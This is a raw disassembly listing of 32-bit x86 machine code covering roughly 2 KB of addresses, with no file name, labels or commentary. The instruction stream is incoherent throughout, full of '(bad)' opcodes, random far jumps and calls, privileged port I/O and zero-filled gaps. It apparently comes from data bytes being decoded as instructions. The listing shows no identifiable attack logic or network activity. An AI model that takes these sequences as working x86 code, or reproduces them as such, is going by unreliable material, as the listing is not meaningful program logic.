  419bca:	dec    edx
  419bcb:	pop    esi
  419bcc:	pop    ebp
  419bcd:	jb     0x419c26
  419bcf:	and    eax,0xf16b654c
  419bd4:	inc    ebp
  419bd5:	push   esp
  419bd6:	cmp    al,BYTE PTR [ecx]
  419bd8:	dec    edi
  419bd9:	dec    edi
  419bda:	inc    esp
  419bdb:	pop    ebp
  419bdc:	push   ebx
  419bdd:	inc    ecx
  419bde:	dec    eax
  419bdf:	dec    esp
  419be0:	pop    esp
  419be1:	dec    esp
  419be2:	addr16 loop 0x419c54
  419be5:	push   edi
  419be6:	imul   ebp,edi,0x60
  419be9:	add    BYTE PTR [ebx+0x746ef3],al
	...
  419bfb:	add    BYTE PTR [eax],al
  419bfd:	sbb    ebp,ecx
  419bff:	imul   edx,DWORD PTR [eax+0x2b],0xfffffff1
  419c03:	add    BYTE PTR ds:0x73e2,al
  419c08:	popa   
  419c09:	push   es
  419c0a:	jmp    0x736e:0xe1ca0071
  419c11:	aad    0xf3
  419c13:	jno    0x419c79
  419c15:	or     cl,BYTE PTR [ebp+0x6b]
  419c18:	jae    0x419bf0
  419c1a:	push   esi
  419c1b:	pop    ebp
  419c1c:	ins    DWORD PTR es:[edi],dx
  419c1d:	xlat   BYTE PTR ds:[ebx]
  419c1e:	add    al,0x51
  419c20:	jae    0x419c09
  419c22:	repnz dec ebp
  419c24:	popa   
  419c25:	arpl   WORD PTR [ecx-0x7e6effd8],ax
  419c2b:	xor    BYTE PTR [ebp+0x6f],ch
  419c2e:	mov    DWORD PTR [ebp+0x67],eax
  419c31:	push   ecx
  419c32:	and    DWORD PTR [esi],0x3c3c4474
  419c38:	add    BYTE PTR [ebx],dh
  419c3a:	aaa    
  419c3b:	xor    esi,DWORD PTR [ebp+edx*1+0x59]
  419c3f:	sub    eax,0x45c4662
  419c44:	inc    esi
  419c45:	adc    dh,bh
  419c47:	xor    eax,0x22f7376d
  419c4c:	ins    DWORD PTR es:[edi],dx
  419c4d:	aaa    
  419c4e:	scas   al,BYTE PTR es:[edi]
  419c4f:	push   esp
  419c50:	ins    DWORD PTR es:[edi],dx
  419c51:	add    eax,0x115f36f2
  419c56:	dec    ecx
  419c57:	pusha  
  419c58:	dec    ebx
  419c59:	add    bh,ah
  419c5b:	aaa    
  419c5c:	addr16 cmc 
  419c5e:	int    0x51
  419c60:	jb     0x419c62
	...
  419c6e:	add    BYTE PTR [eax],al
  419c70:	or     dl,BYTE PTR [ebx]
  419c72:	ss ja  0x419c7c
  419c75:	scas   al,BYTE PTR es:[edi]
  419c76:	pop    ebp
  419c77:	xor    DWORD PTR [ecx],esi
  419c79:	in     al,dx
  419c7a:	sub    BYTE PTR [ebp+ebx*1-0x46],dh
  419c7e:	xor    DWORD PTR [esi],ebp
  419c80:	retf   0x2908
  419c83:	add    BYTE PTR [ebp-0x2898ad16],ah
  419c89:	add    DWORD PTR [ebx],esi
  419c8b:	cs mov edx,0x9f002ad0
  419c91:	push   0xdc9f7426
  419c96:	sub    dh,BYTE PTR [esi-0x3a]
  419c99:	scas   al,BYTE PTR es:[edi]
  419c9a:	push   ecx
  419c9b:	pop    edi
  419c9c:	mov    al,0x7b
  419c9e:	pop    eax
  419c9f:	ins    DWORD PTR es:[edi],dx
  419ca0:	xchg   ecx,eax
  419ca1:	ret    0x5301
  419ca4:	xchg   ecx,eax
  419ca5:	ret    0x5301
  419ca8:	nop
  419ca9:	shl    DWORD PTR [ebx],0x4e
  419cac:	add    BYTE PTR ds:0x53632694,0x8e
  419cb3:	xor    BYTE PTR [edi+0x41],ch
  419cb6:	xor    BYTE PTR ds:0x30932480,0x71
  419cbd:	ds out 0x53,eax
  419cc0:	dec    esi
  419cc1:	xor    esi,DWORD PTR [ebx+0x3]
  419cc4:	xor    ch,BYTE PTR [eax]
  419cc6:	lea    esi,[edi]
  419cc8:	push   esi
  419cc9:	es jns 0x419cf2
  419ccc:	daa    
  419ccd:	push   esp
  419cce:	push   esi
  419ccf:	aaa    
  419cd0:	aaa    
  419cd1:	sub    eax,0x5607
	...
  419ce2:	add    BYTE PTR [edi+ebp*1],bh
  419ce5:	dec    esp
  419ce6:	adc    DWORD PTR ss:[ecx+0x44],0x25
  419ceb:	cmp    esp,DWORD PTR [edi]
  419ced:	push   esi
  419cee:	xor    BYTE PTR [esi],cl
  419cf0:	and    BYTE PTR [eax+0x27],dl
  419cf3:	adc    bl,BYTE PTR [ecx+0x1e]
  419cf6:	daa    
  419cf7:	add    DWORD PTR [ecx+0x39],eax
  419cfa:	sub    ecx,DWORD PTR ds:0xe454322
  419d00:	daa    
  419d01:	or     eax,0x310227
  419d06:	xor    ebp,edi
  419d08:	xor    esp,edi
  419d0a:	push   esp
  419d0b:	add    BYTE PTR [ebx],dh
  419d0d:	std    
  419d0e:	rcl    DWORD PTR es:[ecx+0x0],1
  419d12:	xor    al,0xc0
  419d14:	add    eax,0xe5b3582d
  419d19:	sub    DWORD PTR [ecx-0x6b],edx
  419d1c:	push   ecx
  419d1d:	mov    ecx,0xa505af50
  419d22:	push   edi
  419d23:	xchg   ebx,eax
  419d24:	inc    edx
  419d25:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419d26:	push   ecx
  419d27:	arpl   di,sp
  419d29:	(bad)  
  419d2a:	xor    eax,0x53a305bd
  419d2f:	xchg   ecx,eax
  419d30:	lds    ebp,FWORD PTR es:[edx]
  419d33:	xchg   DWORD PTR [eax],esp
  419d35:	add    BYTE PTR [edx+0x2d7b8460],bh
  419d3b:	jae    0x419cc4
  419d3d:	mov    cl,0x11
  419d3f:	dec    ecx
  419d40:	xor    al,0xad
  419d42:	push   ds
  419d43:	dec    eax
  419d44:	xor    DWORD PTR [ecx+ebx*4+0x0],esi
	...
  419d54:	add    BYTE PTR [eax],al
  419d56:	out    dx,al
  419d57:	jmp    0x317a8688
  419d5c:	je     0x419dd7
  419d5e:	xchg   edi,eax
  419d5f:	sti    
  419d60:	sub    al,0xce
  419d62:	pusha  
  419d63:	pop    ds
  419d64:	je     0x419ddf
  419d66:	into   
  419d67:	jmp    0x35d58698
  419d6c:	arpl   WORD PTR [ebx-0x7a],bx
  419d6f:	add    eax,0x21854875
  419d74:	cs dec ebp
  419d76:	xchg   BYTE PTR [ecx],dh
  419d78:	add    BYTE PTR [esi],ch
  419d7a:	adc    BYTE PTR [eax],ch
  419d7c:	cmp    ax,0x5654
  419d80:	jb     0x419dc6
  419d82:	add    ecx,DWORD PTR [eax+0x70]
  419d85:	dec    esp
  419d86:	push   ecx
  419d87:	push   esi
  419d88:	and    BYTE PTR [edx],bl
  419d8a:	xor    al,0x1f
  419d8c:	je     0x419dac
  419d8e:	inc    esi
  419d8f:	xor    esp,DWORD PTR [ebx-0x17]
  419d92:	and    al,0x56
  419d94:	jno    0x419db3
  419d96:	xchg   DWORD PTR [edx+0x67],eax
  419d99:	sbb    edi,DWORD PTR [edx]
  419d9b:	and    al,0x74
  419d9d:	push   ss
  419d9e:	xchg   ecx,eax
  419d9f:	cs xor ecx,ebp
  419da2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419da3:	push   esi
  419da4:	jno    0x419da3
  419da6:	inc    eax
  419da7:	aas    
  419da8:	outs   dx,BYTE PTR ds:[esi]
  419da9:	cli    
  419daa:	mov    WORD PTR [esi+0x6c],ss
  419dad:	aad    0x40
  419daf:	inc    esi
  419db0:	pop    edi
  419db1:	aad    0x88
  419db3:	add    eax,0x337bd94d
  419db8:	pop    edi
  419db9:	inc    DWORD PTR [eax]
	...
  419dc7:	add    BYTE PTR [eax],al
  419dc9:	cwde   
  419dca:	push   ecx
  419dcb:	dec    ebx
  419dcc:	add    dh,dl
  419dce:	push   ebp
  419dcf:	outs   dx,DWORD PTR ds:[esi]
  419dd0:	push   0x5c6be61f
  419dd5:	and    eax,0xd66e60f2
  419dda:	loop   0x419e46
  419ddc:	ins    DWORD PTR es:[edi],dx
  419ddd:	xlat   BYTE PTR ds:[ebx]
  419dde:	loopne 0x419e4d
  419de0:	fs or  ch,bh
  419de3:	fs jae 0x419dc5
  419de6:	fbstp  TBYTE PTR [ebx+0x70]
  419de9:	leave  
  419dea:	repz jne 0x419e60
  419ded:	mov    ah,0xe3
  419def:	outs   dx,BYTE PTR fs:[esi]
  419df1:	retf   0x3d55
  419df4:	arpl   di,bx
  419df6:	inc    ebx
  419df7:	inc    ebp
  419df8:	push   esp
  419df9:	mov    edx,0x1e666b52
  419dfe:	out    dx,al
  419dff:	pop    esp
  419e00:	jb     0x419e21
  419e02:	and    eax,0x431f633d
  419e07:	inc    ebp
  419e08:	push   esp
  419e09:	mov    edx,0x8a555254
  419e0e:	push   edx
  419e0f:	dec    ebx
  419e10:	inc    esi
  419e11:	outs   dx,BYTE PTR ds:[esi]
  419e12:	dec    esi
  419e13:	cmp    eax,0x3f253f52
  419e18:	ins    BYTE PTR es:[edi],dx
  419e19:	sbb    esi,edx
  419e1b:	outs   dx,BYTE PTR ds:[esi]
  419e1c:	gs pop ecx
  419e1e:	and    eax,0xec5a7954
  419e23:	dec    ebx
  419e24:	imul   ebx,DWORD PTR [eax+0x25],0xb0384377
  419e2b:	inc    ebx
  419e2c:	xor    al,BYTE PTR [eax]
	...
  419e3a:	add    BYTE PTR [eax],al
  419e3c:	mov    DWORD PTR [ecx-0x46ddd2bd],edi
  419e42:	ss xor al,0x27
  419e45:	mov    ebp,0xb679413e
  419e4a:	aas    
  419e4b:	inc    ebx
  419e4c:	or     al,0xae
  419e4e:	sub    dh,BYTE PTR [ebx+ebx*2]
  419e51:	dec    edx
  419e52:	ss xor al,0x63
  419e55:	popa   
  419e56:	out    dx,eax
  419e57:	xor    al,0x9d
  419e59:	sbb    esi,ebp
  419e5b:	xor    al,0x9e
  419e5d:	sahf   
  419e5e:	push   edx
  419e5f:	dec    ebp
  419e60:	popf   
  419e61:	call   0x415d:0x61b13f56
  419e68:	ja     0x419e27
  419e6a:	xor    dh,BYTE PTR [ecx-0x7a]
  419e6d:	(bad)  
  419e6e:	pop    ebp
  419e6f:	push   esp
  419e70:	jp     0x419e00
  419e72:	sub    BYTE PTR [edx+edi*2-0x80],cl
  419e76:	pop    ebp
  419e77:	jns    0x419ea3
  419e79:	imul   eax,DWORD PTR [ebx+esi*1-0x6a],0x8636ef71
  419e81:	imul   esi,esp,0xf5c99131
  419e87:	xor    al,0x8e
  419e89:	jnp    0x419e7b
  419e8b:	inc    ecx
  419e8c:	and    BYTE PTR [ebx],dl
  419e8e:	stc    
  419e8f:	sub    bl,BYTE PTR [esi]
  419e91:	sbb    bh,ah
  419e93:	xor    DWORD PTR [esi-0x1c],esi
  419e96:	sti    
  419e97:	das    
  419e98:	ins    BYTE PTR es:[edi],dx
  419e99:	pslld  mm0,QWORD PTR [eax+0x1e]
  419e9d:	sahf   
  419e9e:	xor    al,0x67
	...
  419eac:	add    BYTE PTR [eax],al
  419eae:	add    BYTE PTR [eax],dl
  419eb0:	dec    ecx
  419eb1:	es je  0x419ec7
  419eb4:	out    dx,eax
  419eb5:	xor    DWORD PTR [esi+0x10],esi
  419eb8:	mov    ah,0x2a
  419eba:	outs   dx,BYTE PTR ds:[esi]
  419ebb:	or     bl,BYTE PTR [esi+0x8f06734]
  419ec1:	es je  0x419eb7
  419ec4:	retf   
  419ec5:	sub    ch,BYTE PTR [esi-0x6]
  419ec8:	popf   
  419ec9:	inc    ebx
  419eca:	push   esp
  419ecb:	mov    bl,0x14
  419ecd:	sub    esi,DWORD PTR [edi-0x3e]
  419ed0:	or     esp,DWORD PTR ds:0x38047d72
  419ed6:	jo     0x419f3b
  419ed8:	in     al,dx
  419ed9:	push   edi
  419eda:	push   eax
  419edb:	xchg   ebp,eax
  419edc:	add    eax,0x2c943ad6
  419ee1:	les    esi,FWORD PTR [ecx]
  419ee3:	jge    0x419f1b
  419ee5:	retf   0x8703
  419ee8:	push   edi
  419ee9:	mov    edi,0x9a248d2a
  419eee:	sub    al,0x7d
  419ef0:	cmp    DWORD PTR ds:0xe7227e21,ecx
  419ef6:	sub    eax,0xedfa3892
  419efb:	and    BYTE PTR [ecx],0x93
  419efe:	add    esp,DWORD PTR [ebp-0x5ba345a8]
  419f04:	and    eax,DWORD PTR [eax-0x45bc9cc9]
  419f0a:	push   eax
  419f0b:	ds pop eax
  419f0d:	(bad)  
  419f0e:	ss dec edi
  419f10:	sub    DWORD PTR [esi+0x34],ecx
	...
  419f22:	cmp    eax,0x3250a505
  419f27:	inc    edi
  419f28:	mov    BYTE PTR [eax],dh
  419f2a:	inc    eax
  419f2b:	sti    
  419f2c:	sbb    bl,BYTE PTR [ebp+0x1f]
  419f2f:	sub    cl,BYTE PTR [edx+0x2d]
  419f32:	inc    edi
  419f33:	sub    ch,BYTE PTR [ecx]
  419f35:	aaa    
  419f36:	cmp    eax,0x6332442b
  419f3b:	pop    eax
  419f3c:	sub    al,0x41
  419f3e:	sbb    al,0x59
  419f40:	and    al,0x4f
  419f42:	cs dec ebx
  419f44:	cmp    DWORD PTR [edi],esp
  419f46:	add    BYTE PTR [esi],bh
  419f48:	xor    esp,DWORD PTR [edi]
  419f4a:	or     BYTE PTR ds:0xf6444937,al
  419f50:	cmp    eax,0x20390045
  419f55:	cs out dx,eax
  419f57:	sub    DWORD PTR [ecx],ebx
  419f59:	cs mov esp,0xcc273221
  419f5f:	push   esi
  419f60:	or     ebp,DWORD PTR ds:0x190005d7
  419f66:	call   0x7436:0xa00e2ee2
  419f6d:	sar    DWORD PTR [ebp+0x23],1
  419f70:	je     0x419f42
  419f72:	adc    DWORD PTR [edx+0x74],0xffffffcc
  419f76:	pusha  
  419f77:	push   ebp
  419f78:	dec    ecx
  419f79:	sbb    BYTE PTR [eax],dl
  419f7b:	push   esi
  419f7c:	inc    esp
  419f7d:	fwait
  419f7e:	mov    bh,0x49
  419f80:	arpl   dx,cx
  419f82:	push   edx
  419f83:	cmp    dh,BYTE PTR [eax-0x43]
	...
  419f92:	add    BYTE PTR [eax],al
  419f94:	add    BYTE PTR [eax+0x55],ah
  419f97:	dec    ecx
  419f98:	clc    
  419f99:	icebp  
  419f9a:	push   ecx
  419f9b:	inc    esi
  419f9c:	fwait
  419f9d:	cmp    eax,0x3f8d5126
  419fa2:	cmp    DWORD PTR [eax],eax
  419fa4:	jmp    0xe941a509
  419fa9:	pusha  
  419faa:	add    eax,0x560e900
  419faf:	add    cl,ch
  419fb1:	pusha  
  419fb2:	add    eax,0x560e900
  419fb7:	add    cl,ch
  419fb9:	pusha  
  419fba:	add    eax,0x560e900
  419fbf:	add    cl,ch
  419fc1:	pusha  
  419fc2:	add    eax,0x226de900
  419fc7:	ins    BYTE PTR es:[edi],dx
  419fc8:	inc    eax
  419fc9:	push   ebx
  419fca:	xor    DWORD PTR es:[edi],edx
  419fcd:	inc    ebx
  419fce:	and    DWORD PTR [ecx+ebp*8+0x55],ebp
  419fd2:	and    ch,BYTE PTR [eax+eax*2+0x53]
  419fd6:	xor    DWORD PTR es:[esi],ecx
  419fd9:	dec    eax
  419fda:	xor    eax,0x345f1763
  419fdf:	outs   dx,DWORD PTR ds:[esi]
  419fe0:	or     eax,0xda63393e
  419fe5:	or     DWORD PTR [esp+ebp*2],esp
  419fe8:	(bad)  
  419fe9:	xchg   ebp,eax
  419fea:	add    BYTE PTR es:[eax],al
  419fed:	pop    ecx
  419fee:	stc    
  419fef:	imul   ebp,DWORD PTR [ecx+0x56],0xffffffe5
  419ff3:	cs pop edi
  419ff5:	dec    edx
  419ff6:	clc    
  419ff7:	pusha  
  419ff8:	jo     0x419ffa
	...
  41a006:	add    BYTE PTR [eax],al
  41a008:	imul   edi,ebx,0x60
  41a00b:	add    BYTE PTR [ecx],bl
  41a00d:	stc    
  41a00e:	imul   ebp,DWORD PTR [ecx+0x16],0xffffffe5
  41a012:	cs pop edi
  41a014:	or     edx,esp
  41a016:	pusha  
  41a017:	jo     0x41a023
  41a019:	sti    
  41a01a:	ins    BYTE PTR es:[edi],dx
  41a01b:	ins    BYTE PTR es:[edi],dx
  41a01c:	xor    esp,edx
  41a01e:	pusha  
  41a01f:	xor    ebp,ebp
  41a021:	jmp    0x5f6d:0xdcc76c6a
  41a028:	sub    cl,dh
  41a02a:	jae    0x41a091
  41a02c:	fld    DWORD PTR ds:0xe0de716f
  41a032:	jae    0x41a099
  41a034:	or     DWORD PTR [edi+0x5f],ecx
  41a037:	outs   dx,DWORD PTR ds:[esi]
  41a038:	pop    esi
  41a039:	cmc    
  41a03a:	push   0x6be7fd6e
  41a03f:	outs   dx,DWORD PTR ds:[esi]
  41a040:	fadd   DWORD PTR ds:0xefdd6d00
  41a046:	outs   dx,BYTE PTR ds:[esi]
  41a047:	jno    0x41a087
  41a049:	loope  0x41a0be
  41a04b:	gs pop ecx
  41a04d:	lahf   
  41a04e:	popa   
  41a04f:	ins    BYTE PTR es:[edi],dx
  41a050:	push   ds
  41a051:	or     DWORD PTR [edi+0x71],ebp
  41a054:	push   ds
  41a055:	loopne 0x41a0ca
  41a057:	gs jns 0x41a0a8
  41a05a:	imul   esi,DWORD PTR [eax+0x27],0xffffffdf
  41a05e:	push   DWORD PTR [edx+0x4b]
  41a061:	frstor [esp+esi*2+0x17]
  41a065:	mov    edx,0xde3e635c
  41a06a:	outs   dx,BYTE PTR ds:[esi]
  41a06b:	add    BYTE PTR gs:[eax],al
	...
  41a07a:	add    BYTE PTR [edx+0x536c6cfa],cl
  41a080:	cmc    
  41a081:	pusha  
  41a082:	xor    esp,DWORD PTR [ebx-0x5]
  41a085:	xor    esi,DWORD PTR [edx-0x3a]
  41a088:	push   cs
  41a089:	and    esi,DWORD PTR [edx-0x42]
  41a08c:	sahf   
  41a08d:	outs   dx,DWORD PTR ss:[esi]
  41a08f:	mov    edi,0x90633015
  41a094:	pop    ss
  41a095:	xor    eax,0x1aec674
  41a09a:	jno    0x41a04e
  41a09c:	fisubr DWORD PTR [esp+esi*2]
  41a09f:	(bad)  
  41a0a0:	or     ebx,DWORD PTR [ecx+0x61]
  41a0a3:	mov    ah,0xca
  41a0a5:	xor    BYTE PTR [ebx-0x73],ch
  41a0a8:	pop    edi
  41a0a9:	and    esi,DWORD PTR [edi-0x71]
  41a0ac:	shl    DWORD PTR [esi],0x0
  41a0af:	nop
  41a0b0:	ins    DWORD PTR es:[edi],dx
  41a0b1:	and    eax,0xf6c18f67
  41a0b6:	pop    esp
  41a0b7:	sub    BYTE PTR [edi+0x25],0x73
  41a0bb:	xchg   BYTE PTR [eax+0x7f7f625a],bl
  41a0c1:	and    eax,DWORD PTR [eax]
  41a0c3:	arpl   WORD PTR [esi-0x619cffff],bx
  41a0c9:	add    DWORD PTR [eax],eax
  41a0cb:	arpl   WORD PTR [esi-0x619cffff],bx
  41a0d1:	add    DWORD PTR [eax],eax
  41a0d3:	arpl   WORD PTR [esi-0x619cffff],bx
  41a0d9:	add    DWORD PTR [eax],eax
  41a0db:	arpl   WORD PTR [esi+0x1],bx
	...
  41a0ed:	add    BYTE PTR [ebx-0x62],ah
  41a0f0:	add    DWORD PTR [eax],eax
  41a0f2:	arpl   WORD PTR [esi+0x36],cx
  41a0f5:	ins    DWORD PTR es:[edi],dx
  41a0f6:	add    eax,0x10632845
  41a0fb:	sbb    BYTE PTR [ecx],ch
  41a0fd:	outs   dx,BYTE PTR ds:[esi]
  41a0fe:	cli    
  41a0ff:	popf   
  41a100:	push   ecx
  41a101:	jb     0x41a0f7
  41a103:	aas    
  41a104:	sub    DWORD PTR [esi+eax*1-0x62],ebp
  41a108:	dec    edx
  41a109:	jno    0x41a11c
  41a10b:	add    eax,0x390c280c
  41a110:	adc    BYTE PTR [edx],dh
  41a112:	add    BYTE PTR ds:0x1dd72337,al
  41a118:	out    0x53,eax
  41a11a:	mov    ah,0x39
  41a11c:	(bad)  
  41a11e:	mov    esi,0x631eff4a
  41a123:	xor    al,0x0
  41a125:	and    ebp,ecx
  41a127:	and    ch,bh
  41a129:	xor    al,0x85
  41a12b:	xor    al,0xd8
  41a12d:	daa    
  41a12e:	les    edi,FWORD PTR [ecx]
  41a130:	les    eax,FWORD PTR [ebx]
  41a132:	mov    dl,0x1e
  41a134:	into   
  41a135:	sub    DWORD PTR [esi-0x6f1625e1],ecx
  41a13b:	sub    eax,0x1e9203bb
  41a140:	(bad)  
  41a141:	sub    DWORD PTR [esi+0x1f],esi
  41a144:	mov    edx,0xaf394ef5
  41a149:	das    
  41a14a:	arpl   WORD PTR [eax+edx*4],si
  41a14d:	and    BYTE PTR [ebp+0x20],bh
  41a150:	lea    esi,[eax+eax*1]
	...
  41a15f:	add    BYTE PTR [eax],al
  41a161:	xor    bl,bh
  41a163:	call   0x43f5:0xca05573b
  41a16a:	add    eax,0x540f5ca
  41a16f:	retf   0x41f5
  41a172:	add    eax,0x4a2f3e9a
  41a177:	stos   BYTE PTR es:[edi],al
  41a178:	dec    edi
  41a179:	sbb    DWORD PTR ds:0x1f373556,0x48
  41a180:	daa    
  41a181:	inc    eax
  41a182:	loope  0x41a18a
  41a184:	pop    ds
  41a185:	or     eax,0x133b5924
  41a18a:	cmp    DWORD PTR [eax+eiz*1+0x30],ecx
  41a18e:	xor    al,0x44
  41a190:	ss cmc 
  41a192:	and    eax,0xe15c4400
  41a197:	pop    ds
  41a198:	inc    esp
  41a199:	dec    ecx
  41a19a:	es jb  0x41a1bd
  41a19d:	aaa    
  41a19e:	cmp    DWORD PTR [ebx+0x5],esp
  41a1a1:	(bad)  
  41a1a3:	jno    0x41a1bf
  41a1a5:	xchg   edx,eax
  41a1a6:	and    BYTE PTR [edx+0x5],dh
  41a1a9:	aas    
  41a1aa:	dec    ecx
  41a1ab:	push   edx
  41a1ac:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  41a1ae:	in     eax,0x6a
  41a1b0:	push   cs
  41a1b1:	test   DWORD PTR [eax+0x6c],edx
  41a1b4:	push   es
  41a1b5:	and    BYTE PTR [esi],0x6e
  41a1b8:	cli    
  41a1b9:	pusha  
  41a1ba:	inc    edi
  41a1bb:	fisttp DWORD PTR [di+0x27]
  41a1bf:	ins    DWORD PTR es:[edi],dx
  41a1c0:	loope  0x41a222
  41a1c2:	push   ecx
  41a1c3:	dec    ebx
  41a1c4:	mov    BYTE PTR [eax],0x0
	...
  41a1d3:	add    BYTE PTR [esi+0x26],bl
  41a1d6:	ins    BYTE PTR es:[edi],dx
  41a1d7:	mov    ebp,0xd0465141
  41a1dc:	push   esi
  41a1dd:	and    ah,BYTE PTR [esi-0x32]
  41a1e0:	dec    eax
  41a1e1:	push   ecx
  41a1e2:	add    BYTE PTR [edx-0x498bd8b5],bl
  41a1e8:	inc    ecx
  41a1e9:	xor    esp,DWORD PTR [ebx-0x3b]
  41a1ec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a1ed:	and    BYTE PTR [edx-0x70],bh
  41a1f0:	cmp    al,0x21
  41a1f2:	pop    edi
  41a1f3:	jmp    0xe96c7dbd
  41a1f8:	cmp    BYTE PTR [ecx],0x70
  41a1fb:	ret    
  41a1fc:	mov    ebx,0x7490ffe1
  41a201:	cmp    DWORD PTR [eax-0x4d],esi
  41a204:	retf   
  41a205:	loope  0x41a206
  41a207:	add    BYTE PTR [ecx+edi*1-0x1e56a590],0x2c
  41a20f:	jmp    0x7b1db5a
  41a214:	addr16 daa 
  41a216:	addr16 pop ebx
  41a218:	inc    edx
  41a219:	inc    edi
  41a21a:	push   esp
  41a21b:	add    BYTE PTR [edx-0xe],ch
  41a21e:	fs je  0x41a240
  41a221:	repnz sub eax,0xfff52b64
  41a227:	push   edx
  41a228:	pop    ds
  41a229:	call   0xda961176
  41a22e:	pusha  
  41a22f:	jns    0x41a2ab
  41a231:	push   esi
  41a232:	dec    ecx
  41a233:	outs   dx,DWORD PTR ds:[esi]
  41a234:	jo     0x41a216
  41a236:	imul   ebp,DWORD PTR [eax+eax*1+0x0],0x0
	...
  41a247:	imul   ecx,DWORD PTR [ebp+0x4f],0x65
  41a24b:	pop    ebx
  41a24c:	cmp    al,0x6b
  41a24e:	outs   dx,BYTE PTR ds:[esi]
  41a24f:	jno    0x41a235
  41a251:	je     0x41a2af
  41a253:	dec    edx
  41a254:	lock imul ebp,DWORD PTR [edi+0x69],0xffffffda
  41a259:	call   FWORD PTR [ebx-0x4]
  41a25c:	in     eax,0x6a
  41a25e:	arpl   WORD PTR [ecx],dx
  41a260:	push   esi
  41a261:	inc    edx
  41a262:	jb     0x41a289
  41a264:	fild   QWORD PTR [esi+0x65]
  41a267:	cmp    BYTE PTR [esi+0x0],dl
  41a26a:	dec    ebp
  41a26b:	xor    eax,0x166c64ec
  41a270:	jmp    0xe708fe74
  41a275:	jns    0x41a2e0
  41a277:	mov    dh,0xe5
  41a279:	pop    esp
  41a27a:	pop    esp
  41a27b:	stos   BYTE PTR es:[edi],al
  41a27c:	repz push 0x66
  41a27f:	shl    ebp,cl
  41a281:	pusha  
  41a282:	jae    0x41a29a
  41a284:	add    cl,BYTE PTR [edi+0x6f]
  41a287:	(bad)  
  41a289:	jb     0x41a2ec
  41a28b:	dec    eax
  41a28c:	in     eax,0x5b
  41a28e:	dec    esp
  41a28f:	(bad)  
  41a291:	pop    esi
  41a292:	push   0x503e0c
  41a297:	or     esi,edx
  41a299:	outs   dx,DWORD PTR ds:[esi]
  41a29a:	inc    esp
  41a29b:	adc    esi,ebx
  41a29d:	dec    DWORD PTR [ebx+0x15]
  41a2a0:	loop   0x41a2fe
  41a2a2:	ins    BYTE PTR es:[edi],dx
  41a2a3:	arpl   ax,sp
  41a2a5:	sub    dh,BYTE PTR [edx+0x63]
  41a2a8:	cmp    ah,BYTE PTR ds:0x6d
	...
  41a2ba:	clc    
  41a2bb:	pop    eax
  41a2bc:	and    esi,DWORD PTR [edx-0x8]
  41a2bf:	std    
  41a2c0:	pop    ds
  41a2c1:	pop    edi
  41a2c2:	neg    DWORD PTR [ebx+0x48ef6752]
  41a2c8:	dec    ebx
  41a2c9:	outs   dx,BYTE PTR ds:[esi]
  41a2ca:	add    eax,0x1d4ee617
  41a2cf:	in     al,dx
  41a2d0:	add    ecx,DWORD PTR [ebp-0x39]
  41a2d3:	add    eax,0xfd9d0026
  41a2d8:	sub    eax,0x3015d16d
  41a2dd:	arpl   ax,dx
  41a2df:	mov    esp,0x9eb75f1d
  41a2e4:	dec    esi
  41a2e5:	(bad)
  41a2e9:	push   eax
  41a2ea:	arpl   di,cx
  41a2ec:	sub    al,0x74
  41a2ee:	mov    esi,0x8163e3cf
  41a2f3:	sahf   
  41a2f4:	inc    edx
  41a2f5:	dec    esp
  41a2f6:	mov    al,0x65
  41a2f8:	cmp    eax,0xf4ad885c
  41a2fd:	inc    eax
  41a2fe:	push   edx
  41a2ff:	(bad)  
  41a300:	out    dx,al
  41a301:	xor    esi,DWORD PTR [edx]
  41a303:	add    DWORD PTR [ebx+0x37],eax
  41a306:	cs pusha 
  41a308:	call   0xefbbd53b
  41a30d:	sub    ch,BYTE PTR [ebx]
  41a30f:	pop    ebp
  41a310:	stc    
  41a311:	das    
  41a312:	mov    cs,esi
  41a314:	icebp  
  41a315:	aaa    
  41a316:	xchg   ebx,eax
  41a317:	pop    ebp
  41a318:	cmp    eax,0x3b709042
  41a31d:	inc    esi
	...
  41a32a:	add    BYTE PTR [eax],al
  41a32c:	add    BYTE PTR [edi+0x4d475529],cl
  41a332:	mov    gs,WORD PTR [edi]
  41a334:	ins    DWORD PTR es:[edi],dx
  41a335:	inc    eax
  41a336:	(bad)  
  41a337:	and    BYTE PTR [edx+0x35],dh
  41a33a:	add    eax,0xf772324c
  41a33f:	out    0x30,al
  41a341:	add    BYTE PTR [edi],dh
  41a343:	pop    ebp
  41a344:	pop    ds
  41a345:	adc    DWORD PTR [eax],edi
  41a347:	std    
  41a348:	cmp    edi,eax
  41a34a:	sbb    bh,ah
  41a34c:	push   edi
  41a34d:	sbb    eax,0x3d1751
  41a352:	xor    DWORD PTR [ebx],edi
  41a354:	pop    ds
  41a355:	icebp  
  41a356:	add    al,0x24
  41a358:	push   ecx
  41a359:	pop    ss
  41a35a:	and    DWORD PTR [ecx],ecx
  41a35c:	repnz and DWORD PTR ss:[eax],ecx
  41a360:	xor    BYTE PTR [ebx+0x56],ah
  41a363:	sub    esp,DWORD PTR [ebx]
  41a365:	iret   
  41a366:	es mov ebp,0xe731ac1f
  41a36c:	push   edi
  41a36d:	mov    al,ds:0xce30f338
  41a372:	and    edi,ebx
  41a374:	push   edi
  41a375:	je     0x41a3b0
  41a377:	and    eax,0xb0059350
  41a37c:	and    eax,0x25d922af
  41a381:	xor    BYTE PTR [ecx],0x7
  41a384:	aas    
  41a385:	fwait
  41a386:	xor    eax,0x229124bb
  41a38b:	mov    ecx,0xcd1eae03
  41a390:	sub    al,BYTE PTR [eax]
	...
  41a39e:	add    BYTE PTR [eax],al
  41a3a0:	lea    esp,[edx]
  41a3a2:	mov    ebx,0xbf289440
  41a3a7:	push   ds
  41a3a8:	mov    ds:0x801f8c37,al
  41a3ad:	sbb    edx,DWORD PTR [ebx-0x65e6c3d6]
  41a3b3:	add    ebp,DWORD PTR [eax]
  41a3b5:	pop    eax
  41a3b6:	(bad)  
  41a3b7:	dec    edx
  41a3b8:	and    ch,ah
  41a3ba:	lods   al,BYTE PTR ds:[esi]
  41a3bb:	dec    edi
  41a3bc:	xor    esp,ebp
  41a3be:	xchg   esi,eax
  41a3bf:	and    dh,BYTE PTR [edx]
  41a3c1:	cmp    BYTE PTR [eax],al
  41a3c3:	jle    0x41a444
  41a3c5:	aaa    
  41a3c6:	fs jp  0x41a429
  41a3c9:	inc    ecx
  41a3ca:	push   eax
  41a3cb:	sub    BYTE PTR [edi],cl
  41a3cd:	inc    esp
